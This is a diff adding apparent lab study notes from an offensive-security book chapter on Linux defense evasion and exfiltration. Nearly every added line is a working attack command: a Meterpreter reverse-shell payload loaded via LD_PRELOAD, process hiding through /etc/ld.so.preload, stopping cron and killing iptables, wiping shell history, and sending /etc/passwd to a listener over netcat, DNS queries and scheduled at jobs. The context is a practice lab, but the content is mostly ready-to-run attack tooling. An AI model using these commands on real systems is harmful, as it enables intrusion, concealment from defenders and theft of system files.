@@ -510,4 +510,134 @@ http://localhost:8888/uploads/s.php?cmd=id
 
 # Defense Evasion And Exfiltration
 
-TODO
+https://secure.eicar.org/eicar.com.txt
+bash ch12/exercise_solution.sh
+
+lsmod
+dpkg --list
+
+# Concealing Malicious Processes
+
+# Library Preloading
+
+### Generate RSP
+echo $LD_PRELOAD
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.16.10.1 LPORT=2222 -f elf-so > meterpreter.so
+file meterpreter.so
+scp -O meterpreter.so backup@172.16.10.13:/tmp
+
+### Set up RSP listener via msfconsole (aka Metasploit)
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST 172.16.10.1
+set LPORT 2222
+run
+
+### Run RSP (did not work)
+LD_PRELOAD=/tmp/meterpreter.so ssh
+LD_LIBRARY_PATH=/tmp/meterpreter.so ssh
+
+# Process Hiding
+
+git clone https://github.com/gianlucaborello/libprocesshider.git
+# Update 'processhider.c' file by replacing 'evil_process.py' string with process name to exclude (e.g. cron, sshd)
+make
+scp -O /home/kali/tools/libprocesshider/libprocesshider.so backup@172.16.10.13:/tmp
+# Needs root access
+echo "/tmp/libprocesshider.so" >> "/etc/ld.so.preload"
+
+# Process Masquerading (and self-destruction)
+
+ps aux | grep -o '\[.*]'
+ps aux | grep -o '\[.*]' | head -8
+
+gcc ch12/system_sleep.c -o ch12/system_sleep
+scp -O /home/kali/Projects/Black-Hat-Bash/ch12/binary_name_rotation.sh backup@172.16.10.13:/tmp
+bash binary_name_rotation.sh
+ps aux
+
+# Dropping Files in Shared Memory
+
+stat /dev/shm
+mount | grep "/dev/shm"
+grep "/dev/shm" "/proc/self/mountinfo"
+mount -o remount ... # lets remount already mounted filesystem changing it behavior (exec binaries vs noexec) - requires root privileges
+
+# Disable Runtime Security Controls
+
+service --status-all
+service [servicename] stop
+service atd stop
+
+systemctl list-units --type=service
+systemctl stop [servicename] # stop service
+systemctl disable [servicename] # prevent service to re-run on boot
+systemctl stop cron
+systemctl disable atd
+
+chkconfig atd off
+
+# Force kill processes
+for pid in $(ps -ef | grep -e "iptables" -e "cron" | awk '{print $2}'); do kill -9 "${pid}"; done
+
+## Manipulate History
+
+history | tail -5
+history -c # clears history
+history -w # writes history to historyfile ($HISTFILE)
+history -c && history -w
+
+# Disable history tracking (add to '.bashrc' file)
+export HISTZIE=0 && export HISTFILE=/dev/null
+
+# Concealing Data
+
+echo "Secret Data" | base64
+echo "Secret Data" | base64 | base64 -d
+echo "Secret Data" | xxd -p
+echo "Secret Data" | xxd -p | xxd -r -p
+# Encode data multiple times (recursively) + use Hexadecimal format via xxd
+echo "Secret Data" | base64 | xxd -p | xxd -r -p | base64 -d
+
+# Encryption
+MY_SECRET="Black Hat Bash"
+echo "${MY_SECRET}" | openssl enc -aes256 -pbkdf2 -base64
+echo "U2FsdGVkX1/5Zrp6SQzzmFs9eaAgBIfDKtxG7XXsQgY=" | openssl aes-256-cbc -d -pbkdf2 -base64
+
+# Exfiltration
+
+socat TCP-LISTEN:12345,reuseaddr,fork - | xxd -p -r
+xxd -p /etc/passwd | nc 172.16.10.1 12345
+
+sudo dnschef \
+    --fakedomains blackhatbash.com \
+    --fakeip 127.0.0.1 --interface 0.0.0.0 \
+    --logfile dnschef.log
+for i in $(xxd -p -c 30 /etc/passwd); do dig $i.blackhatbash.com @172.16.10.1; done
+echo "6e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a" | xxd -r -p
+
+Text Storage Sites
+springe, pastebin.com, dpaste
+
+echo "Black Hat Bash" | curl -s -F "content=<-" https://dpaste.com/api/v2/
+curl https://dpaste.com/7KEC48UBX.txt
+
+Sharding Files
+for line in $(seq 1 1000); do echo "line number ${line}"; done >> 1000_line_file.txt
+split -l 500 -d --verbose 1000_line_file.txt
+wc -l x00 x01 1000_line_file.txt
+split -d --verbose --bytes=5000 1000_line_file.txt
+split -d --verbose --number=10 1000_line_file.txt
+ls -l x*
+
+socat TCP-LISTEN:12345,reuseaddr,fork -
+
+---
+cd /tmp
+for file in $(split -d --verbose -l 5 "/etc/passwd"); do
+  for prefix in $(echo ${file} | awk '{print $NF}' | grep -o '[0-9]*'); do
+    echo "cat /tmp/x${prefix} | nc 172.16.10.1 12345" | at now "+${prefix}minutes"
+  done
+done
+---
